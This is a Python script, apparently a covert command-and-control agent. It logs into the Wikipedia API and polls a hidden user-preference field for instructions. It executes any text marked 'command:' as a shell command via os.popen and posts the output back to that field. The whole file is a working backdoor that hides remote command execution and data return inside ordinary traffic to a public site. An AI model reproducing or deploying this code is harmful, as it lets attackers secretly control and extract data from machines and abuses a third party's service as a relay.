import requests
import time
import os

# Set authentication creds and api_url
username = 'FILLIN'
password = 'FILLIN' # see https://www.mediawiki.org/wiki/Manual:Bot_passwords
api_url = 'https://en.wikipedia.org/w/api.php'

# initiate session
session = requests.Session()

# get login token
r1 = session.get(api_url, params={
    'format': 'json',
    'action': 'query',
    'meta': 'tokens',
    'type': 'login',
})
r1.raise_for_status()

# log in
r2 = session.post(api_url, data={
    'format': 'json',
    'action': 'login',
    'lgname': username,
    'lgpassword': password,
    'lgtoken': r1.json()['query']['tokens']['logintoken'],
})
if r2.json()['login']['result'] != 'Success':
    raise RuntimeError(r2.json()['login']['reason'])
	
#print(r2.json())

# get csrf token
PARAMS_2 = {
    "action": "query",
    "meta": "tokens",
    "format": "json"
}

R = session.get(url=api_url, params=PARAMS_2)
DATA = R.json()

#print(DATA)

CSRF_TOKEN = DATA['query']['tokens']['csrftoken']

# set checkin frequency
CHECK_IN = 5

while True:
    HAVE_COMMAND = False
    COMMAND = ""
    # if there's no incoming command, loop
    while not HAVE_COMMAND:
        time.sleep(CHECK_IN)
        
        PARAMS_4 = {
            "action": "query",
            "format": "json",
            "meta": "userinfo",
            "uiprop":"options"
        }

        R = session.post(api_url, data=PARAMS_4)
        DATA = R.json()

        COMMAND = DATA['query']['userinfo']['options']['userjs-arbitraryKeyName']
        # incoming commands start with "command:"
        if COMMAND.startswith("command:"):
            HAVE_COMMAND = True
    
    # Execute the command and print output to the local window
    output = os.popen(COMMAND.split(":",1)[1]).read()  
    print(output)
    
    # post back the result of the command
    PARAMS_3 = {
        "action": "options",
        "format": "json",
        "token": CSRF_TOKEN,
        "optionname": "userjs-arbitraryKeyName",
        "optionvalue": "result:" + output
    }
    
    R = session.post(api_url, data=PARAMS_3)
    DATA = R.json()

    print(DATA)